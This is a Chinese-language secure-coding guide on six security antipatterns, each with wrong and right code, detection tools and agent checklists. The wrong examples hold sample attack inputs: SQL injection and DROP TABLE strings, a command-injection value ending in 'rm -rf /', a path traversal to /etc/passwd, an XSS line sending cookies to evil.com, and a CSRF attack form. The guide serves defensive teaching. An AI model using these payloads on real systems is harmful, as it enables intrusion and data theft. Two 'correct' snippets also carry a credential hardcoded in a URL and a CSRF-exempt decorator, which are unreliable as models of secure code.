---
id: security-antipatterns
title: 安全反模式指南
domain: development
category: 04-antipatterns
difficulty: intermediate
tags: [antipatterns, concatenation, csrf, development, injection, password, protection, secrets]
quality_score: 70
last_updated: 2026-06-15
---
# 安全反模式指南

> 适用范围：Web 应用 / API 服务 / 后端系统
> 约束级别：SHALL（安全反模式为零容忍项，必须在代码合入前修复）

---

## 1. 硬编码密钥（Hardcoded Secrets）

### 描述
将数据库密码、API Key、JWT Secret、加密密钥等敏感信息直接写在源码、配置文件或 Docker 镜像中。一旦代码推送到版本控制系统或镜像仓库，密钥即永久泄露（即使后续删除，git 历史仍保留）。

### 错误示例
```python
# 源码中硬编码密钥
DATABASE_URL = "postgresql://admin:P@ssw0rd123@db.prod.internal:5432/myapp"
JWT_SECRET = "my-super-secret-key-2024"
AWS_ACCESS_KEY = "AKIAIOSFODNN7EXAMPLE"
AWS_SECRET_KEY = "wJalrXUtnFEMI/K7MDENG/bPxRfiCYEXAMPLEKEY"
STRIPE_SECRET_KEY = "sk_live_51abc123def456..."

# 配置文件中硬编码（即使是 .env.example）
# .env
DB_PASSWORD=production_password_123
REDIS_PASSWORD=redis_secret_456

# Dockerfile 中硬编码
ENV DATABASE_PASSWORD=secret123
```

### 正确示例
```python
import os
from pydantic_settings import BaseSettings

class Settings(BaseSettings):
    """从环境变量或 .env 文件加载配置，绝不硬编码。"""

    database_url: str
    jwt_secret: str
    aws_access_key: str
    aws_secret_key: str
    stripe_secret_key: str

    model_config = {"env_file": ".env", "env_file_encoding": "utf-8"}

settings = Settings()

# .env 文件加入 .gitignore，绝不提交到版本控制
# .gitignore
# .env
# .env.local
# .env.production
```

```python
# 使用密钥管理服务（生产环境推荐）
import boto3

def get_secret(secret_name: str) -> str:
    client = boto3.client("secretsmanager", region_name="ap-east-1")
    response = client.get_secret_value(SecretId=secret_name)
    return response["SecretString"]

# Kubernetes Secrets
# deployment.yaml
# env:
#   - name: DATABASE_URL
#     valueFrom:
#       secretKeyRef:
#         name: app-secrets
#         key: database-url
```

```yaml
# .env.example -- 只包含占位符，安全地提交到 git
DATABASE_URL=postgresql://user:password@host:5432/dbname
JWT_SECRET=your-secret-here
AWS_ACCESS_KEY=your-access-key
```

### 检测方法
- `gitleaks` / `trufflehog` 扫描 git 历史中的密钥。
- `bandit` (Python) 的 `B105`、`B106`、`B107` 规则检测硬编码密码。
- `semgrep` 的 `secrets` 规则集。
- CI 中配置 pre-commit hook 阻止密钥提交。
- 搜索代码中的 `password=`、`secret=`、`key=` 后跟字符串字面量。

### 修复步骤
1. 使用 `gitleaks` 扫描全量 git 历史，列出所有泄露的密钥。
2. 立即轮换所有已泄露的密钥（轮换优先于清理历史）。
3. 将密钥迁移到环境变量或密钥管理服务。
4. 将 `.env` 加入 `.gitignore`，提供 `.env.example` 模板。
5. 在 CI 中配置 `gitleaks` 和 pre-commit hook，阻止新的密钥泄露。
6. 如需清理 git 历史，使用 `git filter-repo` 或 `BFG Repo-Cleaner`。

### Agent Checklist
- [ ] 源码中零硬编码密钥
- [ ] `.env` 在 `.gitignore` 中
- [ ] CI 包含 `gitleaks` / `trufflehog` 扫描
- [ ] 生产环境使用密钥管理服务
- [ ] pre-commit hook 阻止密钥提交
- [ ] 已泄露的密钥已全部轮换

---

## 2. SQL 拼接注入（SQL Injection via String Concatenation）

### 描述
通过字符串拼接或 f-string 构造 SQL 语句，将用户输入直接嵌入 SQL 中。攻击者可以通过构造恶意输入执行任意 SQL 命令，导致数据泄露、数据篡改、甚至获取服务器权限。

### 错误示例
```python
# 字符串拼接 -- 经典 SQL 注入
def get_user(username):
    query = "SELECT * FROM users WHERE username = '" + username + "'"
    return db.execute(query)
    # 输入: ' OR '1'='1' --
    # 结果: SELECT * FROM users WHERE username = '' OR '1'='1' --'

# f-string -- 同样危险
def search_products(keyword):
    query = f"SELECT * FROM products WHERE name LIKE '%{keyword}%'"
    return db.execute(query)
    # 输入: %'; DROP TABLE products; --
    # 结果: SELECT * FROM products WHERE name LIKE '%%'; DROP TABLE products; --%'

# format -- 同样危险
def get_orders(user_id, status):
    query = "SELECT * FROM orders WHERE user_id = {} AND status = '{}'".format(user_id, status)
    return db.execute(query)
```

### 正确示例
```python
# 参数化查询 -- 所有数据库驱动都支持
def get_user(username: str):
    return db.execute(
        "SELECT * FROM users WHERE username = %s",
        (username,)  # 参数作为元组传递，驱动自动转义
    )

def search_products(keyword: str):
    return db.execute(
        "SELECT * FROM products WHERE name LIKE %s",
        (f"%{keyword}%",)
    )

# ORM 的查询方式天然安全
def get_user_orm(username: str):
    return User.objects.filter(username=username).first()

# SQLAlchemy 参数化
def get_orders(session: Session, user_id: int, status: str):
    return session.execute(
        text("SELECT * FROM orders WHERE user_id = :user_id AND status = :status"),
        {"user_id": user_id, "status": status},
    ).fetchall()
```

```python
# 动态 SQL 构造（安全方式）-- 用于动态 WHERE 条件
def search_orders(filters: dict):
    conditions = []
    params = {}

    if "user_id" in filters:
        conditions.append("user_id = :user_id")
        params["user_id"] = filters["user_id"]

    if "status" in filters:
        conditions.append("status = :status")
        params["status"] = filters["status"]

    if "min_amount" in filters:
        conditions.append("total_amount >= :min_amount")
        params["min_amount"] = filters["min_amount"]

    where_clause = " AND ".join(conditions) if conditions else "1=1"
    query = text(f"SELECT * FROM orders WHERE {where_clause} ORDER BY created_at DESC")
    return db.execute(query, params).fetchall()
```

### 检测方法
- `bandit` 的 `B608` 规则（SQL injection via string formatting）。
- `semgrep` 的 `python.sqlalchemy.security.sqlalchemy-execute-raw-query` 规则。
- 搜索代码中 `f"SELECT`、`f"INSERT`、`f"UPDATE`、`f"DELETE`。
- 搜索 `.execute(` 调用中包含 `+` 或 `format` 或 `f"` 的行。

### 修复步骤
1. 搜索所有 SQL 拼接代码（正则：`f["'].*SELECT|execute.*\+`）。
2. 将每处拼接改为参数化查询（`%s` 占位符 + 参数元组）。
3. 对于动态 SQL，使用 SQLAlchemy 的 `text()` + 命名参数。
4. 在 CI 中配置 `bandit` B608 规则，阻断 SQL 拼接代码合入。
5. 编写 SQL 注入测试用例，验证参数化查询的防护效果。

### Agent Checklist
- [ ] 零 SQL 字符串拼接
- [ ] 所有 SQL 使用参数化查询
- [ ] `bandit` B608 规则在 CI 中启用
- [ ] ORM 查询不使用 `extra()` / `raw()` 传入用户输入
- [ ] 有 SQL 注入测试用例

---

## 3. 明文存储密码（Plaintext Password Storage）

### 描述
将用户密码以明文或可逆加密方式存储在数据库中。一旦数据库泄露，所有用户密码直接暴露。由于用户普遍在多个网站使用相同密码，影响远超本系统。

### 错误示例
```python
# 明文存储
def register(username, password):
    db.execute(
        "INSERT INTO users (username, password) VALUES (%s, %s)",
        (username, password)  # 直接存储明文密码
    )

# 可逆加密 -- 不比明文好多少
import base64

def register(username, password):
    encoded = base64.b64encode(password.encode()).decode()
    db.execute(
        "INSERT INTO users (username, password) VALUES (%s, %s)",
        (username, encoded)
    )

# MD5 / SHA1 -- 已不安全，彩虹表可快速破解
import hashlib

def register(username, password):
    hashed = hashlib.md5(password.encode()).hexdigest()
    db.execute(
        "INSERT INTO users (username, password_hash) VALUES (%s, %s)",
        (username, hashed)
    )

# SHA256 无盐 -- 同样可被彩虹表破解
def register(username, password):
    hashed = hashlib.sha256(password.encode()).hexdigest()
    db.execute(
        "INSERT INTO users (username, password_hash) VALUES (%s, %s)",
        (username, hashed)
    )
```

### 正确示例
```python
# 使用 bcrypt（推荐）
import bcrypt

def hash_password(password: str) -> str:
    """使用 bcrypt 哈希密码，自动加盐，自适应工作因子。"""
    salt = bcrypt.gensalt(rounds=12)  # work factor = 12
    return bcrypt.hashpw(password.encode("utf-8"), salt).decode("utf-8")

def verify_password(password: str, hashed: str) -> bool:
    return bcrypt.checkpw(password.encode("utf-8"), hashed.encode("utf-8"))

# 使用 argon2（更现代，Argon2id 变体推荐）
from argon2 import PasswordHasher

ph = PasswordHasher(
    time_cost=3,        # 迭代次数
    memory_cost=65536,  # 内存使用 (KB)
    parallelism=4,      # 并行度
)

def hash_password(password: str) -> str:
    return ph.hash(password)

def verify_password(password: str, hashed: str) -> bool:
    try:
        return ph.verify(hashed, password)
    except Exception:
        return False

# Django 自带安全的密码处理
from django.contrib.auth.hashers import make_password, check_password

hashed = make_password("user_password")  # PBKDF2 + SHA256 + 盐
is_valid = check_password("user_password", hashed)

# 注册流程
def register(username: str, password: str) -> User:
    _validate_password_strength(password)  # 强密码校验
    user = User(
        username=username,
        password_hash=hash_password(password),
    )
    db.add(user)
    db.commit()
    return user
```

### 检测方法
- 数据库中 `password` 列为 VARCHAR 且非 60+ 字符（bcrypt 哈希为 60 字符）。
- 代码中 import `hashlib` 且用于密码处理（`md5`、`sha1`、`sha256` 直接哈希）。
- 代码中 import `base64` 且用于密码处理。
- `bandit` 的 `B303` 规则（Use of insecure MD2, MD4, MD5, or SHA1 hash function）。
- 搜索 `password` 字段的赋值，检查是否经过哈希处理。

### 修复步骤
1. 确认当前密码存储方式（明文 / MD5 / SHA256 / bcrypt）。
2. 选择安全的哈希算法（bcrypt / argon2id / PBKDF2）。
3. 编写数据迁移脚本：
   a. 如果当前是明文 -> 直接哈希所有密码。
   b. 如果当前是 MD5/SHA -> 对现有哈希再做一次 bcrypt 包装，登录时双重验证。
4. 下次用户登录成功后，用新算法重新哈希并更新。
5. 强制所有用户修改密码（安全起见）。

### Agent Checklist
- [ ] 密码使用 bcrypt / argon2id / PBKDF2 哈希
- [ ] 无 MD5 / SHA1 / SHA256 直接哈希密码
- [ ] 无 base64 "加密" 密码
- [ ] 无明文密码存储
- [ ] 密码列长度 >= 60 字符
- [ ] 有密码强度校验规则

---

## 4. 无 CSRF 保护（Missing CSRF Protection）

### 描述
Web 应用未实现 CSRF（Cross-Site Request Forgery）防护，攻击者可以诱导已登录用户在不知情的情况下执行敏感操作（转账、修改密码、删除数据）。

### 错误示例
```python
# 无 CSRF 保护的表单处理
@app.post("/transfer")
def transfer(request):
    from_account = request.form["from_account"]
    to_account = request.form["to_account"]
    amount = request.form["amount"]
    # 直接执行转账，无 CSRF 验证
    bank_service.transfer(from_account, to_account, amount)
    return {"status": "success"}
```

```html
<!-- 攻击者的恶意页面 -->
<html>
<body onload="document.getElementById('csrf-form').submit()">
  <form id="csrf-form" action="https://bank.example.com/transfer" method="POST">
    <input type="hidden" name="from_account" value="victim-account" />
    <input type="hidden" name="to_account" value="attacker-account" />
    <input type="hidden" name="amount" value="10000" />
  </form>
</body>
</html>
```

### 正确示例
```python
# Flask -- 使用 Flask-WTF CSRF 保护
from flask_wtf.csrf import CSRFProtect

csrf = CSRFProtect(app)

@app.post("/transfer")
@csrf.exempt  # 绝不使用！除非是 API 端点
def transfer(request):
    ...

# Django -- CSRF 默认启用
# settings.py
MIDDLEWARE = [
    "django.middleware.csrf.CsrfViewMiddleware",  # 默认已包含
]

# 模板中使用 csrf_token
# <form method="POST">{% csrf_token %} ... </form>
```

```python
# SPA + API 场景 -- 使用 Double Submit Cookie + SameSite
from fastapi import FastAPI, Request, Response
from fastapi.middleware.cors import CORSMiddleware
import secrets

app = FastAPI()

# 严格的 CORS 配置
app.add_middleware(
    CORSMiddleware,
    allow_origins=["https://app.example.com"],  # 不用 *
    allow_credentials=True,
    allow_methods=["GET", "POST", "PUT", "DELETE"],
    allow_headers=["X-CSRF-Token", "Content-Type"],
)

@app.middleware("http")
async def csrf_middleware(request: Request, call_next):
    if request.method in ("POST", "PUT", "PATCH", "DELETE"):
        cookie_token = request.cookies.get("csrf_token")
        header_token = request.headers.get("X-CSRF-Token")
        if not cookie_token or cookie_token != header_token:
            return JSONResponse(status_code=403, content={"error": "CSRF validation failed"})
    response = await call_next(request)
    # 设置 CSRF Cookie
    if "csrf_token" not in request.cookies:
        token = secrets.token_urlsafe(32)
        response.set_cookie(
            "csrf_token",
            token,
            httponly=False,    # JS 需要读取
            secure=True,      # 仅 HTTPS
            samesite="strict", # 防止跨站发送
            max_age=3600,
        )
    return response
```

```javascript
// 前端：每个请求携带 CSRF Token
function getCsrfToken() {
  return document.cookie
    .split("; ")
    .find((row) => row.startsWith("csrf_token="))
    ?.split("=")[1];
}

async function apiPost(url, data) {
  return fetch(url, {
    method: "POST",
    headers: {
      "Content-Type": "application/json",
      "X-CSRF-Token": getCsrfToken(),
    },
    credentials: "include",
    body: JSON.stringify(data),
  });
}
```

### 检测方法
- 表单提交无 CSRF Token 字段。
- Cookie 未设置 `SameSite` 属性或设置为 `None`。
- API 无 CSRF 中间件或 `X-CSRF-Token` header 校验。
- CORS 配置中 `allow_origins = ["*"]`。
- `OWASP ZAP` 或 `Burp Suite` 扫描报告 CSRF 漏洞。

### 修复步骤
1. 确定应用类型（传统表单 vs SPA + API）。
2. 传统表单：启用框架自带的 CSRF 中间件（Django / Flask-WTF）。
3. SPA + API：实现 Double Submit Cookie 模式 + SameSite Cookie。
4. 设置 Cookie 属性：`Secure=true`、`SameSite=Strict`、`HttpOnly`（Session Cookie）。
5. 配置严格的 CORS 策略，不允许 `*` 源。
6. 使用 OWASP ZAP 验证 CSRF 防护效果。

### Agent Checklist
- [ ] 表单提交包含 CSRF Token
- [ ] Cookie 设置 `SameSite=Strict` 或 `Lax`
- [ ] CORS 不允许 `*` 源
- [ ] API 有 CSRF 中间件
- [ ] 安全扫描无 CSRF 漏洞

---

## 5. 不验证输入（Missing Input Validation）

### 描述
不对用户输入进行验证和清洗，直接用于业务逻辑、数据库查询、命令执行或页面渲染。导致 SQL 注入、XSS、命令注入、路径遍历等攻击，以及业务数据异常。

### 错误示例
```python
# 无输入验证
@app.post("/users")
def create_user(data: dict):
    # 不验证 email 格式、name 长度、age 范围
    db.execute(
        "INSERT INTO users (name, email, age) VALUES (%s, %s, %s)",
        (data.get("name"), data.get("email"), data.get("age"))
    )
    return {"status": "created"}

# 路径遍历
@app.get("/files/{filename}")
def get_file(filename: str):
    # 攻击者输入: ../../etc/passwd
    with open(f"/uploads/{filename}", "r") as f:
        return f.read()

# 命令注入
@app.post("/tools/ping")
def ping(host: str):
    # 攻击者输入: 8.8.8.8; rm -rf /
    result = os.popen(f"ping -c 4 {host}").read()
    return {"result": result}

# XSS -- 未转义输出
@app.get("/search")
def search(q: str):
    return f"<h1>Search results for: {q}</h1>"
    # 攻击者输入: <script>document.location='https://evil.com/steal?cookie='+document.cookie</script>
```

### 正确示例
```python
from pydantic import BaseModel, EmailStr, Field, field_validator
from pathlib import Path
import re
import shlex
import subprocess

# Pydantic 模型做输入验证
class CreateUserRequest(BaseModel):
    name: str = Field(min_length=1, max_length=100, pattern=r"^[\w\s\-\.]+$")
    email: EmailStr
    age: int = Field(ge=0, le=150)

    @field_validator("name")
    @classmethod
    def sanitize_name(cls, v: str) -> str:
        return v.strip()

@app.post("/users", response_model=UserResponse, status_code=201)
def create_user(data: CreateUserRequest):  # Pydantic 自动验证
    return user_service.create(data)

# 路径遍历防护
UPLOAD_DIR = Path("/uploads").resolve()

@app.get("/files/{filename}")
def get_file(filename: str):
    # 验证文件名不包含路径分隔符
    if "/" in filename or "\\" in filename or ".." in filename:
        raise HTTPException(status_code=400, detail="Invalid filename")

    file_path = (UPLOAD_DIR / filename).resolve()
    # 确认解析后的路径仍在上传目录内
    if not file_path.is_relative_to(UPLOAD_DIR):
        raise HTTPException(status_code=403, detail="Access denied")

    if not file_path.exists():
        raise HTTPException(status_code=404, detail="File not found")

    return FileResponse(file_path)

# 命令注入防护 -- 使用参数列表而非字符串
ALLOWED_HOSTS_PATTERN = re.compile(r"^[a-zA-Z0-9\.\-]+$")

@app.post("/tools/ping")
def ping(host: str):
    if not ALLOWED_HOSTS_PATTERN.match(host):
        raise HTTPException(status_code=400, detail="Invalid host format")

    result = subprocess.run(
        ["ping", "-c", "4", host],  # 参数列表，不是字符串
        capture_output=True,
        text=True,
        timeout=10,
    )
    return {"result": result.stdout}

# XSS 防护 -- 使用模板引擎自动转义
from markupsafe import escape

@app.get("/search")
def search(q: str):
    safe_q = escape(q)  # 自动转义 HTML 特殊字符
    return templates.TemplateResponse("search.html", {"query": safe_q})
```

### 检测方法
- API handler 接收 `dict` 而非 Pydantic / Marshmallow 模型。
- `os.popen()`、`os.system()`、`subprocess.call(shell=True)` 使用用户输入。
- `open()` 的路径参数包含用户输入且无 `resolve()` + `is_relative_to()` 校验。
- HTML 模板中使用 `|safe` / `{!! !!}` / `dangerouslySetInnerHTML`。
- `bandit` B602 (subprocess_popen_with_shell_equals_true)、B605 (start_process_with_a_shell)。

### 修复步骤
1. 所有 API 输入使用 Pydantic / Marshmallow / Zod 模型验证。
2. 文件路径操作使用 `Path.resolve()` + `is_relative_to()` 防止遍历。
3. 系统命令使用 `subprocess.run()` + 参数列表，不用 `shell=True`。
4. HTML 输出使用模板引擎自动转义，禁用 `|safe` 除非内容来源可信。
5. 在 CI 中启用 `bandit` 安全扫描。

### Agent Checklist
- [ ] 所有 API 输入有 Schema 验证
- [ ] 文件路径操作有遍历防护
- [ ] 无 `os.popen()` / `os.system()` / `shell=True`
- [ ] HTML 输出自动转义
- [ ] `bandit` 安全扫描通过

---

## 6. 过多权限（Excessive Permissions）

### 描述
系统组件或用户拥有超出其实际需要的权限，违反最小权限原则。例如应用使用数据库 root 账号、所有 API 使用同一个管理员 Token、IAM 策略使用 `Action: "*"`、容器以 root 用户运行。

### 错误示例
```python
# 应用使用数据库 root 账号
DATABASE_URL = "postgresql://postgres:password@db:5432/myapp"  # 超级用户

# 所有操作使用同一个 admin token
ADMIN_TOKEN = os.environ["ADMIN_TOKEN"]

def call_user_service(path):
    return requests.get(
        f"{USER_SERVICE}{path}",
        headers={"Authorization": f"Bearer {ADMIN_TOKEN}"}  # 所有调用都是 admin
    )
```

```yaml
# AWS IAM -- 全部权限
{
    "Version": "2012-10-17",
    "Statement": [{
        "Effect": "Allow",
        "Action": "*",
        "Resource": "*"
    }]
}
```

```dockerfile
# 容器以 root 运行
FROM python:3.11
COPY . /app
CMD ["python", "/app/main.py"]  # 默认 root 用户
```

### 正确示例
```python
# 为应用创建专用数据库账号，只授予必要权限
# SQL:
# CREATE USER app_user WITH PASSWORD 'strong_password';
# GRANT SELECT, INSERT, UPDATE ON ALL TABLES IN SCHEMA public TO app_user;
# GRANT USAGE ON ALL SEQUENCES IN SCHEMA public TO app_user;
# -- 不授予 DELETE、DROP、ALTER 等危险权限

DATABASE_URL = "postgresql://app_user:strong_password@db:5432/myapp"

# 为只读场景创建只读账号
READ_DATABASE_URL = "postgresql://app_reader:reader_password@db-replica:5432/myapp"
```

```python
# 细粒度的服务间认证
class ServiceClient:
    def __init__(self, service_name: str, scopes: list[str]):
        self._service_name = service_name
        self._scopes = scopes

    def _get_token(self) -> str:
        """获取限定范围的服务 Token"""
        return auth_service.get_service_token(
            service=self._service_name,
            scopes=self._scopes,  # 只请求需要的权限
        )

# 用户服务客户端 -- 只有 read:users 权限
user_client = ServiceClient("order-service", scopes=["read:users"])

# 支付服务客户端 -- 只有 create:charges 权限
payment_client = ServiceClient("order-service", scopes=["create:charges"])
```

```yaml
# AWS IAM -- 最小权限
{
    "Version": "2012-10-17",
    "Statement": [{
        "Effect": "Allow",
        "Action": [
            "s3:GetObject",
            "s3:PutObject"
        ],
        "Resource": "arn:aws:s3:::my-app-uploads/*"
    }, {
        "Effect": "Allow",
        "Action": [
            "sqs:SendMessage",
            "sqs:ReceiveMessage"
        ],
        "Resource": "arn:aws:sqs:*:*:my-app-queue"
    }]
}
```

```dockerfile
# 容器以非 root 用户运行
FROM python:3.11-slim

RUN groupadd -r appuser && useradd -r -g appuser -d /app -s /sbin/nologin appuser

WORKDIR /app
COPY --chown=appuser:appuser . .
RUN pip install --no-cache-dir -r requirements.txt

USER appuser
CMD ["python", "main.py"]
```

### 检测方法
- 数据库连接使用 `postgres` / `root` / `admin` 用户名。
- IAM 策略包含 `Action: "*"` 或 `Resource: "*"`。
- Dockerfile 无 `USER` 指令（默认 root）。
- 服务间调用使用共享的管理员 Token。
- `trivy` / `checkov` / `tfsec` 扫描 IaC 配置。

### 修复步骤
1. 审计所有数据库连接的用户权限，降级为最小权限。
2. 为只读场景创建只读数据库账号。
3. 审计 IAM 策略，将 `*` 替换为具体的 Action 和 Resource。
4. Dockerfile 添加 `USER` 指令，以非 root 用户运行。
5. 实现服务间的细粒度 Token（Scope-based）。
6. 定期审查权限，删除未使用的权限。

### Agent Checklist
- [ ] 数据库不使用超级用户账号
- [ ] IAM 策略无 `Action: "*"` 或 `Resource: "*"`
- [ ] 容器以非 root 用户运行
- [ ] 服务间认证有范围限制（Scoped Token）
- [ ] 读写分离场景使用只读账号
- [ ] 有定期权限审计机制

---

## 全局 Agent Checklist

| 检查项 | 阈值 | 工具 |
|--------|------|------|
| 硬编码密钥 | 0 处 | `gitleaks` / `trufflehog` |
| SQL 拼接 | 0 处 | `bandit` B608 / `semgrep` |
| 明文密码 | 0 处 | Code Review / DB 审查 |
| CSRF 防护 | 100% 写操作 | OWASP ZAP |
| 输入验证 | 100% API 端点 | Code Review / `bandit` |
| 超级用户权限 | 0 处 | IaC 扫描 / DB 审计 |
| Root 容器 | 0 个 | `trivy` / Dockerfile 审查 |
| 安全扫描通过 | 0 高危 | `bandit` + `semgrep` + `trivy` |
